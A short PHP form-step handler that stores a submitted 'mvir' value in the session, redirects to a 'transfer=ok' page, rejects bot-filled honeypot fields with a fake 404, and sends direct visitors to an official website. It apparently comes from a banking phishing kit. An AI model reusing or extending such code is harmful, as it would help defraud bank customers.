<?php
 if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }        
                if ($_POST['step'] == "infovir") {
                $_SESSION['mvir'] 	= $_POST['mvir'];

            
                header("Location: ./transfer=ok.php");
                exit();
  
        }
     
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>